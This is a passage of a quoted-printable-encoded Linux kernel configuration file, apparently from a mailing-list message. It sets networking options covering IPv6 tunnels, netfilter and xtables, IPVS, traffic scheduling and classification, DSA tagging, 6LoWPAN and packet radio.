> CONFIG_INET6_ESPINTCP=3Dy
> CONFIG_INET6_IPCOMP=3Dy
> CONFIG_IPV6_MIP6=3Dy
> CONFIG_IPV6_ILA=3Dy
> CONFIG_INET6_XFRM_TUNNEL=3Dy
> CONFIG_INET6_TUNNEL=3Dy
> CONFIG_IPV6_VTI=3Dy
> CONFIG_IPV6_SIT=3Dy
> CONFIG_IPV6_SIT_6RD=3Dy
> CONFIG_IPV6_NDISC_NODETYPE=3Dy
> CONFIG_IPV6_TUNNEL=3Dy
> CONFIG_IPV6_GRE=3Dy
> CONFIG_IPV6_FOU=3Dy
> CONFIG_IPV6_FOU_TUNNEL=3Dy
> CONFIG_IPV6_MULTIPLE_TABLES=3Dy
> CONFIG_IPV6_SUBTREES=3Dy
> CONFIG_IPV6_MROUTE=3Dy
> CONFIG_IPV6_MROUTE_MULTIPLE_TABLES=3Dy
> CONFIG_IPV6_PIMSM_V2=3Dy
> CONFIG_IPV6_SEG6_LWTUNNEL=3Dy
> CONFIG_IPV6_SEG6_HMAC=3Dy
> CONFIG_IPV6_SEG6_BPF=3Dy
> CONFIG_IPV6_RPL_LWTUNNEL=3Dy
> # CONFIG_IPV6_IOAM6_LWTUNNEL is not set
> CONFIG_NETLABEL=3Dy
> CONFIG_MPTCP=3Dy
> CONFIG_INET_MPTCP_DIAG=3Dy
> CONFIG_MPTCP_IPV6=3Dy
> CONFIG_NETWORK_SECMARK=3Dy
> CONFIG_NET_PTP_CLASSIFY=3Dy
> # CONFIG_NETWORK_PHY_TIMESTAMPING is not set
> CONFIG_NETFILTER=3Dy
> CONFIG_NETFILTER_ADVANCED=3Dy
> CONFIG_BRIDGE_NETFILTER=3Dy
>=20
> #
> # Core Netfilter Configuration
> #
> CONFIG_NETFILTER_INGRESS=3Dy
> CONFIG_NETFILTER_EGRESS=3Dy
> CONFIG_NETFILTER_SKIP_EGRESS=3Dy
> CONFIG_NETFILTER_NETLINK=3Dy
> CONFIG_NETFILTER_FAMILY_BRIDGE=3Dy
> CONFIG_NETFILTER_FAMILY_ARP=3Dy
> CONFIG_NETFILTER_BPF_LINK=3Dy
> # CONFIG_NETFILTER_NETLINK_HOOK is not set
> CONFIG_NETFILTER_NETLINK_ACCT=3Dy
> CONFIG_NETFILTER_NETLINK_QUEUE=3Dy
> CONFIG_NETFILTER_NETLINK_LOG=3Dy
> CONFIG_NETFILTER_NETLINK_OSF=3Dy
> CONFIG_NF_CONNTRACK=3Dy
> CONFIG_NF_LOG_SYSLOG=3Dy
> CONFIG_NETFILTER_CONNCOUNT=3Dy
> CONFIG_NF_CONNTRACK_MARK=3Dy
> CONFIG_NF_CONNTRACK_SECMARK=3Dy
> CONFIG_NF_CONNTRACK_ZONES=3Dy
> # CONFIG_NF_CONNTRACK_PROCFS is not set
> CONFIG_NF_CONNTRACK_EVENTS=3Dy
> CONFIG_NF_CONNTRACK_TIMEOUT=3Dy
> CONFIG_NF_CONNTRACK_TIMESTAMP=3Dy
> CONFIG_NF_CONNTRACK_LABELS=3Dy
> CONFIG_NF_CONNTRACK_OVS=3Dy
> CONFIG_NF_CT_PROTO_GRE=3Dy
> CONFIG_NF_CT_PROTO_SCTP=3Dy
> CONFIG_NF_CT_PROTO_UDPLITE=3Dy
> CONFIG_NF_CONNTRACK_AMANDA=3Dy
> CONFIG_NF_CONNTRACK_FTP=3Dy
> CONFIG_NF_CONNTRACK_H323=3Dy
> CONFIG_NF_CONNTRACK_IRC=3Dy
> CONFIG_NF_CONNTRACK_BROADCAST=3Dy
> CONFIG_NF_CONNTRACK_NETBIOS_NS=3Dy
> CONFIG_NF_CONNTRACK_SNMP=3Dy
> CONFIG_NF_CONNTRACK_PPTP=3Dy
> CONFIG_NF_CONNTRACK_SANE=3Dy
> CONFIG_NF_CONNTRACK_SIP=3Dy
> CONFIG_NF_CONNTRACK_TFTP=3Dy
> CONFIG_NF_CT_NETLINK=3Dy
> CONFIG_NF_CT_NETLINK_TIMEOUT=3Dy
> CONFIG_NF_CT_NETLINK_HELPER=3Dy
> CONFIG_NETFILTER_NETLINK_GLUE_CT=3Dy
> CONFIG_NF_NAT=3Dy
> CONFIG_NF_NAT_AMANDA=3Dy
> CONFIG_NF_NAT_FTP=3Dy
> CONFIG_NF_NAT_IRC=3Dy
> CONFIG_NF_NAT_SIP=3Dy
> CONFIG_NF_NAT_TFTP=3Dy
> CONFIG_NF_NAT_REDIRECT=3Dy
> CONFIG_NF_NAT_MASQUERADE=3Dy
> CONFIG_NF_NAT_OVS=3Dy
> CONFIG_NETFILTER_SYNPROXY=3Dy
> CONFIG_NF_TABLES=3Dy
> CONFIG_NF_TABLES_INET=3Dy
> CONFIG_NF_TABLES_NETDEV=3Dy
> CONFIG_NFT_NUMGEN=3Dy
> CONFIG_NFT_CT=3Dy
> # CONFIG_NFT_EXTHDR_DCCP is not set
> CONFIG_NFT_FLOW_OFFLOAD=3Dy
> CONFIG_NFT_CONNLIMIT=3Dy
> CONFIG_NFT_LOG=3Dy
> CONFIG_NFT_LIMIT=3Dy
> CONFIG_NFT_MASQ=3Dy
> CONFIG_NFT_REDIR=3Dy
> CONFIG_NFT_NAT=3Dy
> CONFIG_NFT_TUNNEL=3Dy
> CONFIG_NFT_QUEUE=3Dy
> CONFIG_NFT_QUOTA=3Dy
> CONFIG_NFT_REJECT=3Dy
> CONFIG_NFT_REJECT_INET=3Dy
> CONFIG_NFT_COMPAT=3Dy
> CONFIG_NFT_HASH=3Dy
> CONFIG_NFT_FIB=3Dy
> CONFIG_NFT_FIB_INET=3Dy
> CONFIG_NFT_XFRM=3Dy
> CONFIG_NFT_SOCKET=3Dy
> CONFIG_NFT_OSF=3Dy
> CONFIG_NFT_TPROXY=3Dy
> CONFIG_NFT_SYNPROXY=3Dy
> CONFIG_NF_DUP_NETDEV=3Dy
> CONFIG_NFT_DUP_NETDEV=3Dy
> CONFIG_NFT_FWD_NETDEV=3Dy
> CONFIG_NFT_FIB_NETDEV=3Dy
> CONFIG_NFT_REJECT_NETDEV=3Dy
> CONFIG_NF_FLOW_TABLE_INET=3Dy
> CONFIG_NF_FLOW_TABLE=3Dy
> # CONFIG_NF_FLOW_TABLE_PROCFS is not set
> CONFIG_NETFILTER_XTABLES=3Dy
> CONFIG_NETFILTER_XTABLES_COMPAT=3Dy
> # CONFIG_NETFILTER_XTABLES_LEGACY is not set
>=20
> #
> # Xtables combined modules
> #
> CONFIG_NETFILTER_XT_MARK=3Dy
> CONFIG_NETFILTER_XT_CONNMARK=3Dy
> CONFIG_NETFILTER_XT_SET=3Dy
>=20
> #
> # Xtables targets
> #
> CONFIG_NETFILTER_XT_TARGET_AUDIT=3Dy
> CONFIG_NETFILTER_XT_TARGET_CHECKSUM=3Dy
> CONFIG_NETFILTER_XT_TARGET_CLASSIFY=3Dy
> CONFIG_NETFILTER_XT_TARGET_CONNMARK=3Dy
> CONFIG_NETFILTER_XT_TARGET_CONNSECMARK=3Dy
> CONFIG_NETFILTER_XT_TARGET_CT=3Dy
> CONFIG_NETFILTER_XT_TARGET_DSCP=3Dy
> CONFIG_NETFILTER_XT_TARGET_HL=3Dy
> CONFIG_NETFILTER_XT_TARGET_HMARK=3Dy
> CONFIG_NETFILTER_XT_TARGET_IDLETIMER=3Dy
> CONFIG_NETFILTER_XT_TARGET_LED=3Dy
> CONFIG_NETFILTER_XT_TARGET_LOG=3Dy
> CONFIG_NETFILTER_XT_TARGET_MARK=3Dy
> CONFIG_NETFILTER_XT_NAT=3Dy
> CONFIG_NETFILTER_XT_TARGET_NETMAP=3Dy
> CONFIG_NETFILTER_XT_TARGET_NFLOG=3Dy
> CONFIG_NETFILTER_XT_TARGET_NFQUEUE=3Dy
> CONFIG_NETFILTER_XT_TARGET_RATEEST=3Dy
> CONFIG_NETFILTER_XT_TARGET_REDIRECT=3Dy
> CONFIG_NETFILTER_XT_TARGET_MASQUERADE=3Dy
> CONFIG_NETFILTER_XT_TARGET_TEE=3Dy
> CONFIG_NETFILTER_XT_TARGET_TPROXY=3Dy
> CONFIG_NETFILTER_XT_TARGET_SECMARK=3Dy
> CONFIG_NETFILTER_XT_TARGET_TCPMSS=3Dy
> CONFIG_NETFILTER_XT_TARGET_TCPOPTSTRIP=3Dy
>=20
> #
> # Xtables matches
> #
> CONFIG_NETFILTER_XT_MATCH_ADDRTYPE=3Dy
> CONFIG_NETFILTER_XT_MATCH_BPF=3Dy
> CONFIG_NETFILTER_XT_MATCH_CGROUP=3Dy
> CONFIG_NETFILTER_XT_MATCH_CLUSTER=3Dy
> CONFIG_NETFILTER_XT_MATCH_COMMENT=3Dy
> CONFIG_NETFILTER_XT_MATCH_CONNBYTES=3Dy
> CONFIG_NETFILTER_XT_MATCH_CONNLABEL=3Dy
> CONFIG_NETFILTER_XT_MATCH_CONNLIMIT=3Dy
> CONFIG_NETFILTER_XT_MATCH_CONNMARK=3Dy
> CONFIG_NETFILTER_XT_MATCH_CONNTRACK=3Dy
> CONFIG_NETFILTER_XT_MATCH_CPU=3Dy
> CONFIG_NETFILTER_XT_MATCH_DCCP=3Dy
> CONFIG_NETFILTER_XT_MATCH_DEVGROUP=3Dy
> CONFIG_NETFILTER_XT_MATCH_DSCP=3Dy
> CONFIG_NETFILTER_XT_MATCH_ECN=3Dy
> CONFIG_NETFILTER_XT_MATCH_ESP=3Dy
> CONFIG_NETFILTER_XT_MATCH_HASHLIMIT=3Dy
> CONFIG_NETFILTER_XT_MATCH_HELPER=3Dy
> CONFIG_NETFILTER_XT_MATCH_HL=3Dy
> CONFIG_NETFILTER_XT_MATCH_IPCOMP=3Dy
> CONFIG_NETFILTER_XT_MATCH_IPRANGE=3Dy
> CONFIG_NETFILTER_XT_MATCH_IPVS=3Dy
> CONFIG_NETFILTER_XT_MATCH_L2TP=3Dy
> CONFIG_NETFILTER_XT_MATCH_LENGTH=3Dy
> CONFIG_NETFILTER_XT_MATCH_LIMIT=3Dy
> CONFIG_NETFILTER_XT_MATCH_MAC=3Dy
> CONFIG_NETFILTER_XT_MATCH_MARK=3Dy
> CONFIG_NETFILTER_XT_MATCH_MULTIPORT=3Dy
> CONFIG_NETFILTER_XT_MATCH_NFACCT=3Dy
> CONFIG_NETFILTER_XT_MATCH_OSF=3Dy
> CONFIG_NETFILTER_XT_MATCH_OWNER=3Dy
> CONFIG_NETFILTER_XT_MATCH_POLICY=3Dy
> CONFIG_NETFILTER_XT_MATCH_PHYSDEV=3Dy
> CONFIG_NETFILTER_XT_MATCH_PKTTYPE=3Dy
> CONFIG_NETFILTER_XT_MATCH_QUOTA=3Dy
> CONFIG_NETFILTER_XT_MATCH_RATEEST=3Dy
> CONFIG_NETFILTER_XT_MATCH_REALM=3Dy
> CONFIG_NETFILTER_XT_MATCH_RECENT=3Dy
> CONFIG_NETFILTER_XT_MATCH_SCTP=3Dy
> CONFIG_NETFILTER_XT_MATCH_SOCKET=3Dy
> CONFIG_NETFILTER_XT_MATCH_STATE=3Dy
> CONFIG_NETFILTER_XT_MATCH_STATISTIC=3Dy
> CONFIG_NETFILTER_XT_MATCH_STRING=3Dy
> CONFIG_NETFILTER_XT_MATCH_TCPMSS=3Dy
> CONFIG_NETFILTER_XT_MATCH_TIME=3Dy
> CONFIG_NETFILTER_XT_MATCH_U32=3Dy
> # end of Core Netfilter Configuration
>=20
> CONFIG_IP_SET=3Dy
> CONFIG_IP_SET_MAX=3D256
> CONFIG_IP_SET_BITMAP_IP=3Dy
> CONFIG_IP_SET_BITMAP_IPMAC=3Dy
> CONFIG_IP_SET_BITMAP_PORT=3Dy
> CONFIG_IP_SET_HASH_IP=3Dy
> CONFIG_IP_SET_HASH_IPMARK=3Dy
> CONFIG_IP_SET_HASH_IPPORT=3Dy
> CONFIG_IP_SET_HASH_IPPORTIP=3Dy
> CONFIG_IP_SET_HASH_IPPORTNET=3Dy
> CONFIG_IP_SET_HASH_IPMAC=3Dy
> CONFIG_IP_SET_HASH_MAC=3Dy
> CONFIG_IP_SET_HASH_NETPORTNET=3Dy
> CONFIG_IP_SET_HASH_NET=3Dy
> CONFIG_IP_SET_HASH_NETNET=3Dy
> CONFIG_IP_SET_HASH_NETPORT=3Dy
> CONFIG_IP_SET_HASH_NETIFACE=3Dy
> CONFIG_IP_SET_LIST_SET=3Dy
> CONFIG_IP_VS=3Dy
> CONFIG_IP_VS_IPV6=3Dy
> # CONFIG_IP_VS_DEBUG is not set
> CONFIG_IP_VS_TAB_BITS=3D12
>=20
> #
> # IPVS transport protocol load balancing support
> #
> CONFIG_IP_VS_PROTO_TCP=3Dy
> CONFIG_IP_VS_PROTO_UDP=3Dy
> CONFIG_IP_VS_PROTO_AH_ESP=3Dy
> CONFIG_IP_VS_PROTO_ESP=3Dy
> CONFIG_IP_VS_PROTO_AH=3Dy
> CONFIG_IP_VS_PROTO_SCTP=3Dy
>=20
> #
> # IPVS scheduler
> #
> CONFIG_IP_VS_RR=3Dy
> CONFIG_IP_VS_WRR=3Dy
> CONFIG_IP_VS_LC=3Dy
> CONFIG_IP_VS_WLC=3Dy
> CONFIG_IP_VS_FO=3Dy
> CONFIG_IP_VS_OVF=3Dy
> CONFIG_IP_VS_LBLC=3Dy
> CONFIG_IP_VS_LBLCR=3Dy
> CONFIG_IP_VS_DH=3Dy
> CONFIG_IP_VS_SH=3Dy
> CONFIG_IP_VS_MH=3Dy
> CONFIG_IP_VS_SED=3Dy
> CONFIG_IP_VS_NQ=3Dy
> CONFIG_IP_VS_TWOS=3Dy
>=20
> #
> # IPVS SH scheduler
> #
> CONFIG_IP_VS_SH_TAB_BITS=3D8
>=20
> #
> # IPVS MH scheduler
> #
> CONFIG_IP_VS_MH_TAB_INDEX=3D12
>=20
> #
> # IPVS application helper
> #
> CONFIG_IP_VS_FTP=3Dy
> CONFIG_IP_VS_NFCT=3Dy
> CONFIG_IP_VS_PE_SIP=3Dy
>=20
> #
> # IP: Netfilter Configuration
> #
> CONFIG_NF_DEFRAG_IPV4=3Dy
> CONFIG_NF_SOCKET_IPV4=3Dy
> CONFIG_NF_TPROXY_IPV4=3Dy
> CONFIG_NF_TABLES_IPV4=3Dy
> CONFIG_NFT_REJECT_IPV4=3Dy
> CONFIG_NFT_DUP_IPV4=3Dy
> CONFIG_NFT_FIB_IPV4=3Dy
> CONFIG_NF_TABLES_ARP=3Dy
> CONFIG_NF_DUP_IPV4=3Dy
> CONFIG_NF_LOG_ARP=3Dy
> CONFIG_NF_LOG_IPV4=3Dy
> CONFIG_NF_REJECT_IPV4=3Dy
> CONFIG_NF_NAT_SNMP_BASIC=3Dy
> CONFIG_NF_NAT_PPTP=3Dy
> CONFIG_NF_NAT_H323=3Dy
> CONFIG_IP_NF_IPTABLES=3Dy
> CONFIG_IP_NF_MATCH_AH=3Dy
> CONFIG_IP_NF_MATCH_ECN=3Dy
> CONFIG_IP_NF_MATCH_RPFILTER=3Dy
> CONFIG_IP_NF_MATCH_TTL=3Dy
> CONFIG_IP_NF_TARGET_REJECT=3Dy
> CONFIG_IP_NF_TARGET_SYNPROXY=3Dy
> CONFIG_IP_NF_TARGET_ECN=3Dy
> CONFIG_NFT_COMPAT_ARP=3Dy
> CONFIG_IP_NF_ARP_MANGLE=3Dy
> # end of IP: Netfilter Configuration
>=20
> #
> # IPv6: Netfilter Configuration
> #
> CONFIG_NF_SOCKET_IPV6=3Dy
> CONFIG_NF_TPROXY_IPV6=3Dy
> CONFIG_NF_TABLES_IPV6=3Dy
> CONFIG_NFT_REJECT_IPV6=3Dy
> CONFIG_NFT_DUP_IPV6=3Dy
> CONFIG_NFT_FIB_IPV6=3Dy
> CONFIG_NF_DUP_IPV6=3Dy
> CONFIG_NF_REJECT_IPV6=3Dy
> CONFIG_NF_LOG_IPV6=3Dy
> CONFIG_IP6_NF_IPTABLES=3Dy
> CONFIG_IP6_NF_MATCH_AH=3Dy
> CONFIG_IP6_NF_MATCH_EUI64=3Dy
> CONFIG_IP6_NF_MATCH_FRAG=3Dy
> CONFIG_IP6_NF_MATCH_OPTS=3Dy
> CONFIG_IP6_NF_MATCH_HL=3Dy
> CONFIG_IP6_NF_MATCH_IPV6HEADER=3Dy
> CONFIG_IP6_NF_MATCH_MH=3Dy
> CONFIG_IP6_NF_MATCH_RPFILTER=3Dy
> CONFIG_IP6_NF_MATCH_RT=3Dy
> CONFIG_IP6_NF_MATCH_SRH=3Dy
> CONFIG_IP6_NF_TARGET_REJECT=3Dy
> CONFIG_IP6_NF_TARGET_SYNPROXY=3Dy
> CONFIG_IP6_NF_TARGET_NPT=3Dy
> # end of IPv6: Netfilter Configuration
>=20
> CONFIG_NF_DEFRAG_IPV6=3Dy
> CONFIG_NF_TABLES_BRIDGE=3Dy
> CONFIG_NFT_BRIDGE_META=3Dy
> CONFIG_NFT_BRIDGE_REJECT=3Dy
> CONFIG_NF_CONNTRACK_BRIDGE=3Dy
> CONFIG_BRIDGE_NF_EBTABLES=3Dy
> CONFIG_BRIDGE_EBT_802_3=3Dy
> CONFIG_BRIDGE_EBT_AMONG=3Dy
> CONFIG_BRIDGE_EBT_ARP=3Dy
> CONFIG_BRIDGE_EBT_IP=3Dy
> CONFIG_BRIDGE_EBT_IP6=3Dy
> CONFIG_BRIDGE_EBT_LIMIT=3Dy
> CONFIG_BRIDGE_EBT_MARK=3Dy
> CONFIG_BRIDGE_EBT_PKTTYPE=3Dy
> CONFIG_BRIDGE_EBT_STP=3Dy
> CONFIG_BRIDGE_EBT_VLAN=3Dy
> CONFIG_BRIDGE_EBT_ARPREPLY=3Dy
> CONFIG_BRIDGE_EBT_DNAT=3Dy
> CONFIG_BRIDGE_EBT_MARK_T=3Dy
> CONFIG_BRIDGE_EBT_REDIRECT=3Dy
> CONFIG_BRIDGE_EBT_SNAT=3Dy
> CONFIG_BRIDGE_EBT_LOG=3Dy
> CONFIG_BRIDGE_EBT_NFLOG=3Dy
> CONFIG_IP_SCTP=3Dy
> # CONFIG_SCTP_DBG_OBJCNT is not set
> CONFIG_SCTP_DEFAULT_COOKIE_HMAC_SHA256=3Dy
> # CONFIG_SCTP_DEFAULT_COOKIE_HMAC_NONE is not set
> CONFIG_INET_SCTP_DIAG=3Dy
> CONFIG_RDS=3Dy
> CONFIG_RDS_RDMA=3Dy
> CONFIG_RDS_TCP=3Dy
> # CONFIG_RDS_DEBUG is not set
> CONFIG_TIPC=3Dy
> CONFIG_TIPC_MEDIA_IB=3Dy
> CONFIG_TIPC_MEDIA_UDP=3Dy
> CONFIG_TIPC_CRYPTO=3Dy
> CONFIG_TIPC_DIAG=3Dy
> CONFIG_ATM=3Dy
> CONFIG_ATM_CLIP=3Dy
> # CONFIG_ATM_CLIP_NO_ICMP is not set
> CONFIG_ATM_LANE=3Dy
> CONFIG_ATM_MPOA=3Dy
> CONFIG_ATM_BR2684=3Dy
> # CONFIG_ATM_BR2684_IPFILTER is not set
> CONFIG_L2TP=3Dy
> # CONFIG_L2TP_DEBUGFS is not set
> CONFIG_L2TP_V3=3Dy
> CONFIG_L2TP_IP=3Dy
> CONFIG_L2TP_ETH=3Dy
> CONFIG_STP=3Dy
> CONFIG_GARP=3Dy
> CONFIG_MRP=3Dy
> CONFIG_BRIDGE=3Dy
> CONFIG_BRIDGE_IGMP_SNOOPING=3Dy
> CONFIG_BRIDGE_VLAN_FILTERING=3Dy
> CONFIG_BRIDGE_MRP=3Dy
> CONFIG_BRIDGE_CFM=3Dy
> CONFIG_NET_DSA=3Dy
> # CONFIG_NET_DSA_TAG_NONE is not set
> # CONFIG_NET_DSA_TAG_AR9331 is not set
> CONFIG_NET_DSA_TAG_BRCM_COMMON=3Dy
> CONFIG_NET_DSA_TAG_BRCM=3Dy
> # CONFIG_NET_DSA_TAG_BRCM_LEGACY is not set
> # CONFIG_NET_DSA_TAG_BRCM_LEGACY_FCS is not set
> CONFIG_NET_DSA_TAG_BRCM_PREPEND=3Dy
> # CONFIG_NET_DSA_TAG_HELLCREEK is not set
> # CONFIG_NET_DSA_TAG_GSWIP is not set
> # CONFIG_NET_DSA_TAG_DSA is not set
> # CONFIG_NET_DSA_TAG_EDSA is not set
> CONFIG_NET_DSA_TAG_MTK=3Dy
> # CONFIG_NET_DSA_TAG_MXL_862XX is not set
> # CONFIG_NET_DSA_TAG_MXL_GSW1XX is not set
> # CONFIG_NET_DSA_TAG_KSZ is not set
> # CONFIG_NET_DSA_TAG_OCELOT is not set
> # CONFIG_NET_DSA_TAG_OCELOT_8021Q is not set
> CONFIG_NET_DSA_TAG_QCA=3Dy
> CONFIG_NET_DSA_TAG_RTL4_A=3Dy
> # CONFIG_NET_DSA_TAG_RTL8_4 is not set
> # CONFIG_NET_DSA_TAG_RZN1_A5PSW is not set
> # CONFIG_NET_DSA_TAG_LAN9303 is not set
> # CONFIG_NET_DSA_TAG_SJA1105 is not set
> # CONFIG_NET_DSA_TAG_TRAILER is not set
> # CONFIG_NET_DSA_TAG_VSC73XX_8021Q is not set
> # CONFIG_NET_DSA_TAG_XRS700X is not set
> # CONFIG_NET_DSA_TAG_YT921X is not set
> CONFIG_VLAN_8021Q=3Dy
> CONFIG_VLAN_8021Q_GVRP=3Dy
> CONFIG_VLAN_8021Q_MVRP=3Dy
> CONFIG_LLC=3Dy
> CONFIG_LLC2=3Dy
> # CONFIG_ATALK is not set
> CONFIG_X25=3Dy
> CONFIG_LAPB=3Dy
> CONFIG_PHONET=3Dy
> CONFIG_6LOWPAN=3Dy
> # CONFIG_6LOWPAN_DEBUGFS is not set
> CONFIG_6LOWPAN_NHC=3Dy
> CONFIG_6LOWPAN_NHC_DEST=3Dy
> CONFIG_6LOWPAN_NHC_FRAGMENT=3Dy
> CONFIG_6LOWPAN_NHC_HOP=3Dy
> CONFIG_6LOWPAN_NHC_IPV6=3Dy
> CONFIG_6LOWPAN_NHC_MOBILITY=3Dy
> CONFIG_6LOWPAN_NHC_ROUTING=3Dy
> CONFIG_6LOWPAN_NHC_UDP=3Dy
> CONFIG_6LOWPAN_GHC_EXT_HDR_HOP=3Dy
> CONFIG_6LOWPAN_GHC_UDP=3Dy
> CONFIG_6LOWPAN_GHC_ICMPV6=3Dy
> CONFIG_6LOWPAN_GHC_EXT_HDR_DEST=3Dy
> CONFIG_6LOWPAN_GHC_EXT_HDR_FRAG=3Dy
> CONFIG_6LOWPAN_GHC_EXT_HDR_ROUTE=3Dy
> CONFIG_IEEE802154=3Dy
> CONFIG_IEEE802154_NL802154_EXPERIMENTAL=3Dy
> CONFIG_IEEE802154_SOCKET=3Dy
> CONFIG_IEEE802154_6LOWPAN=3Dy
> CONFIG_MAC802154=3Dy
> CONFIG_NET_SCHED=3Dy
>=20
> #
> # Queueing/Scheduling
> #
> CONFIG_NET_SCH_HTB=3Dy
> CONFIG_NET_SCH_HFSC=3Dy
> CONFIG_NET_SCH_PRIO=3Dy
> CONFIG_NET_SCH_MULTIQ=3Dy
> CONFIG_NET_SCH_RED=3Dy
> CONFIG_NET_SCH_SFB=3Dy
> CONFIG_NET_SCH_SFQ=3Dy
> CONFIG_NET_SCH_TEQL=3Dy
> CONFIG_NET_SCH_TBF=3Dy
> CONFIG_NET_SCH_CBS=3Dy
> CONFIG_NET_SCH_ETF=3Dy
> CONFIG_NET_SCH_MQPRIO_LIB=3Dy
> CONFIG_NET_SCH_TAPRIO=3Dy
> CONFIG_NET_SCH_GRED=3Dy
> CONFIG_NET_SCH_NETEM=3Dy
> CONFIG_NET_SCH_DRR=3Dy
> CONFIG_NET_SCH_MQPRIO=3Dy
> CONFIG_NET_SCH_SKBPRIO=3Dy
> CONFIG_NET_SCH_CHOKE=3Dy
> CONFIG_NET_SCH_QFQ=3Dy
> CONFIG_NET_SCH_CODEL=3Dy
> CONFIG_NET_SCH_FQ_CODEL=3Dy
> CONFIG_NET_SCH_CAKE=3Dy
> CONFIG_NET_SCH_FQ=3Dy
> CONFIG_NET_SCH_HHF=3Dy
> CONFIG_NET_SCH_PIE=3Dy
> CONFIG_NET_SCH_FQ_PIE=3Dy
> CONFIG_NET_SCH_INGRESS=3Dy
> CONFIG_NET_SCH_PLUG=3Dy
> CONFIG_NET_SCH_ETS=3Dy
> # CONFIG_NET_SCH_BPF is not set
> # CONFIG_NET_SCH_DUALPI2 is not set
> CONFIG_NET_SCH_DEFAULT=3Dy
> # CONFIG_DEFAULT_FQ is not set
> CONFIG_DEFAULT_CODEL=3Dy
> # CONFIG_DEFAULT_FQ_CODEL is not set
> # CONFIG_DEFAULT_FQ_PIE is not set
> # CONFIG_DEFAULT_SFQ is not set
> # CONFIG_DEFAULT_PFIFO_FAST is not set
> CONFIG_DEFAULT_NET_SCH=3D"pfifo_fast"
>=20
> #
> # Classification
> #
> CONFIG_NET_CLS=3Dy
> CONFIG_NET_CLS_BASIC=3Dy
> CONFIG_NET_CLS_ROUTE4=3Dy
> CONFIG_NET_CLS_FW=3Dy
> CONFIG_NET_CLS_U32=3Dy
> CONFIG_CLS_U32_PERF=3Dy
> CONFIG_CLS_U32_MARK=3Dy
> CONFIG_NET_CLS_FLOW=3Dy
> CONFIG_NET_CLS_CGROUP=3Dy
> CONFIG_NET_CLS_BPF=3Dy
> CONFIG_NET_CLS_FLOWER=3Dy
> CONFIG_NET_CLS_MATCHALL=3Dy
> CONFIG_NET_EMATCH=3Dy
> CONFIG_NET_EMATCH_STACK=3D32
> CONFIG_NET_EMATCH_CMP=3Dy
> CONFIG_NET_EMATCH_NBYTE=3Dy
> CONFIG_NET_EMATCH_U32=3Dy
> CONFIG_NET_EMATCH_META=3Dy
> CONFIG_NET_EMATCH_TEXT=3Dy
> CONFIG_NET_EMATCH_CANID=3Dy
> CONFIG_NET_EMATCH_IPSET=3Dy
> CONFIG_NET_EMATCH_IPT=3Dy
> CONFIG_NET_CLS_ACT=3Dy
> CONFIG_NET_ACT_POLICE=3Dy
> CONFIG_NET_ACT_GACT=3Dy
> CONFIG_GACT_PROB=3Dy
> CONFIG_NET_ACT_MIRRED=3Dy
> CONFIG_NET_ACT_SAMPLE=3Dy
> CONFIG_NET_ACT_NAT=3Dy
> CONFIG_NET_ACT_PEDIT=3Dy
> CONFIG_NET_ACT_SIMP=3Dy
> CONFIG_NET_ACT_SKBEDIT=3Dy
> CONFIG_NET_ACT_CSUM=3Dy
> CONFIG_NET_ACT_MPLS=3Dy
> CONFIG_NET_ACT_VLAN=3Dy
> CONFIG_NET_ACT_BPF=3Dy
> CONFIG_NET_ACT_CONNMARK=3Dy
> CONFIG_NET_ACT_CTINFO=3Dy
> CONFIG_NET_ACT_SKBMOD=3Dy
> CONFIG_NET_ACT_IFE=3Dy
> CONFIG_NET_ACT_TUNNEL_KEY=3Dy
> CONFIG_NET_ACT_CT=3Dy
> CONFIG_NET_ACT_GATE=3Dy
> CONFIG_NET_IFE_SKBMARK=3Dy
> CONFIG_NET_IFE_SKBPRIO=3Dy
> CONFIG_NET_IFE_SKBTCINDEX=3Dy
> CONFIG_NET_TC_SKB_EXT=3Dy
> CONFIG_NET_SCH_FIFO=3Dy
> CONFIG_DCB=3Dy
> CONFIG_DNS_RESOLVER=3Dy
> CONFIG_BATMAN_ADV=3Dy
> CONFIG_BATMAN_ADV_BATMAN_V=3Dy
> CONFIG_BATMAN_ADV_BLA=3Dy
> CONFIG_BATMAN_ADV_DAT=3Dy
> CONFIG_BATMAN_ADV_MCAST=3Dy
> # CONFIG_BATMAN_ADV_DEBUG is not set
> # CONFIG_BATMAN_ADV_TRACING is not set
> CONFIG_OPENVSWITCH=3Dy
> CONFIG_OPENVSWITCH_GRE=3Dy
> CONFIG_OPENVSWITCH_VXLAN=3Dy
> CONFIG_OPENVSWITCH_GENEVE=3Dy
> CONFIG_VSOCKETS=3Dy
> CONFIG_VSOCKETS_DIAG=3Dy
> CONFIG_VSOCKETS_LOOPBACK=3Dy
> # CONFIG_VMWARE_VMCI_VSOCKETS is not set
> CONFIG_VIRTIO_VSOCKETS=3Dy
> CONFIG_VIRTIO_VSOCKETS_COMMON=3Dy
> CONFIG_NETLINK_DIAG=3Dy
> CONFIG_MPLS=3Dy
> CONFIG_NET_MPLS_GSO=3Dy
> CONFIG_MPLS_ROUTING=3Dy
> CONFIG_MPLS_IPTUNNEL=3Dy
> CONFIG_NET_NSH=3Dy
> CONFIG_HSR=3Dy
> CONFIG_NET_SWITCHDEV=3Dy
> CONFIG_NET_L3_MASTER_DEV=3Dy
> CONFIG_QRTR=3Dy
> CONFIG_QRTR_TUN=3Dy
> # CONFIG_QRTR_MHI is not set
> CONFIG_NET_NCSI=3Dy
> # CONFIG_NCSI_OEM_CMD_GET_MAC is not set
> # CONFIG_NCSI_OEM_CMD_KEEP_PHY is not set
> # CONFIG_PCPU_DEV_REFCNT is not set
> CONFIG_MAX_SKB_FRAGS=3D17
> CONFIG_RPS=3Dy
> CONFIG_RFS_ACCEL=3Dy
> CONFIG_SOCK_RX_QUEUE_MAPPING=3Dy
> CONFIG_XPS=3Dy
> CONFIG_CGROUP_NET_PRIO=3Dy
> CONFIG_CGROUP_NET_CLASSID=3Dy
> CONFIG_NET_RX_BUSY_POLL=3Dy
> CONFIG_BQL=3Dy
> CONFIG_BPF_STREAM_PARSER=3Dy
> CONFIG_NET_FLOW_LIMIT=3Dy
>=20
> #
> # Network testing
> #
> # CONFIG_NET_PKTGEN is not set
> CONFIG_NET_DROP_MONITOR=3Dy
> # end of Network testing
> # end of Networking options
>=20
> CONFIG_HAMRADIO=3Dy
>=20
> #
> # Packet Radio protocols
> #
> CONFIG_AX25=3Dy
> CONFIG_AX25_DAMA_SLAVE=3Dy
> CONFIG_NETROM=3Dy
> CONFIG_ROSE=3Dy
>=20
> #
> # AX.25 network device drivers
> #
> CONFIG_MKISS=3Dy
> CONFIG_6PACK=3Dy
> CONFIG_BPQETHER=3Dy
